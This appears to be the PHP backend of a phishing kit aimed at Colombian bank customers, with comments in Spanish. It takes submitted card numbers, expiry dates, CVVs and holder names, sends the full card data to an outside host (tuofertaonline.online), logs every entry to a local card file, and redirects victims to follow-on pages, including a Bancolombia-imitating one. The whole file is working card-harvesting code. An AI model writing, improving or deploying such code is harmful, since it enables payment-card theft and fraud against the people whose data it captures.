<?php
error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');

// CONFIGURACIÓN DE PROVEEDOR DE BIN
// Opciones: 'tuofertaonline', 'bincodes', 'fraudlabspro'
define('BIN_PROVIDER', 'tuofertaonline');

// CLAVES DE API (Rellenar si se usa bincodes o fraudlabspro)
define('BINCODES_API_KEY', 'YOUR_BINCODES_API_KEY');
define('FRAUDLABSPRO_API_KEY', 'YOUR_FRAUDLABSPRO_API_KEY');

// Obtener datos del cuerpo del POST
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['cardNumber'])) {
    http_response_code(400);
    echo json_encode(array('status' => 'error', 'message' => 'No se recibieron datos válidos o falta el número de tarjeta.'));
    exit;
}

$cardNumber = preg_replace('/\s+/', '', $data['cardNumber']);
$bin = substr($cardNumber, 0, 6);

$issuer = 'Desconocido';
$scheme = 'Desconocido';

// 1. CONSULTAR EL BIN SEGÚN EL PROVEEDOR CONFIGURADO
if (BIN_PROVIDER === 'bincodes' && BINCODES_API_KEY !== 'YOUR_BINCODES_API_KEY') {
    // Proveedor BinCodes
    $url = "https://api.bincodes.com/bin/?format=json&api_key=" . urlencode(BINCODES_API_KEY) . "&bin=" . urlencode($bin);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['bank']) && !empty($result['bank'])) {
            $issuer = $result['bank'];
        }
        if (isset($result['card']) && !empty($result['card'])) {
            $scheme = $result['card'];
        }
    }
} elseif (BIN_PROVIDER === 'fraudlabspro' && FRAUDLABSPRO_API_KEY !== 'YOUR_FRAUDLABSPRO_API_KEY') {
    // Proveedor FraudLabs Pro BIN Lookup API
    $url = "https://api.fraudlabspro.com/v1/bin/lookup?key=" . urlencode(FRAUDLABSPRO_API_KEY) . "&bin=" . urlencode($bin) . "&format=json";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['card_issuing_bank']) && !empty($result['card_issuing_bank'])) {
            $issuer = $result['card_issuing_bank'];
        }
        if (isset($result['card_brand']) && !empty($result['card_brand'])) {
            $scheme = $result['card_brand'];
        }
    }
} else {
    // Proveedor por defecto: tuofertaonline (usado originalmente en load.php)
    $cardData = array(
        'number' => $cardNumber,
        'expiry_month' => isset($data['expMonth']) ? $data['expMonth'] : "12",
        'expiry_year' => isset($data['expYear']) ? $data['expYear'] : "2025",
        'cvv' => isset($data['cvv']) ? $data['cvv'] : "221",
        'name' => isset($data['ownerName']) ? $data['ownerName'] : "PEDRO MONTES",
        'billing_address' => array('country' => "CO"),
        'phone' => (object) array()
    );

    $ch = curl_init('https://tuofertaonline.online/web/apicc.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($cardData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $result = json_decode($response, true);
        if (isset($result['issuer']) && !empty($result['issuer'])) {
            $issuer = $result['issuer'];
        }
        if (isset($result['scheme']) && !empty($result['scheme'])) {
            $scheme = $result['scheme'];
        }
    }
}

// 2. ACTUALIZAR LOS DATOS PARA EL LOG Y RESPUESTA
$data['bank'] = $issuer;
$data['type'] = $scheme;

// 3. GUARDAR EL LOG EN EL ARCHIVO LOCAL (Igual que loadtiketid.php)
$logFile = dirname(__DIR__, 2) . '/registro_tarjetas.txt';
$logData = "[" . date('Y-m-d H:i:s') . "] " . json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
@file_put_contents($logFile, $logData, FILE_APPEND);

// 4. DETERMINAR EL TIPO DE TARJETA SEGÚN EL PRIMER DÍGITO
$firstDigit = $cardNumber[0];
$cardType = 'Desconocido';
switch ($firstDigit) {
    case '4':
        $cardType = 'Visa';
        break;
    case '5':
        $cardType = 'MasterCard';
        break;
    case '3':
        $cardType = 'American Express';
        break;
    case '6':
        $cardType = 'Discover';
        break;
}

// 5. DETERMINAR LA DIRECCIÓN DE REDIRECCIÓN SEGÚN EL BANCO DETECTADO
$bancoNormalizado = strtolower($issuer);
$redirectUrl = 'dinadatos/id.html';

// Excepción: Redirigir a bancolombia si el banco lo contiene y no es nequi
if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormalizado, 'bancolombia s.a.- nequi') === false) {
    $redirectUrl = 'dinadatos/bancol/index-pc.html';
}

// 6. ENVIAR LA RESPUESTA JSON DE ÉXITO
echo json_encode(array(
    'status' => 'success',
    'bank' => $issuer,
    'cardType' => $cardType,
    'type' => $scheme,
    'redirect' => $redirectUrl
), JSON_UNESCAPED_UNICODE);
?>
